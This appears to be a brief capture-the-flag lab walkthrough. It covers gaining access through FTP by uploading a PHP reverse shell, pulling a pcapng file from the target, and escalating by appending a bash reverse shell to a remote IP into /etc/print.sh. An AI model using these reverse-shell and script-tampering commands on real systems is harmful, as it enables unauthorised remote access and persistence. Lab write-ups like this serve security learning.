Starting from the hard part
after getting into the ftp services, there is a directory called ftp redirect to it and then upload the edited reverse php shell file
and then listen on the port and redirect to the web page  and click on it then you are one step in the services
go to the incidents directory to get the file inside it use first this command there   'python3 -m http.server 8080'
then open another terminal and download the file using this command 'wget 10.10.243.235:8080/suspicious.pcapng'

modify the the print.sh to this
echo " /bin/bash -i >& /dev/tcp/10.10.182.245/3456 0>&1" >> /etc/print.sh
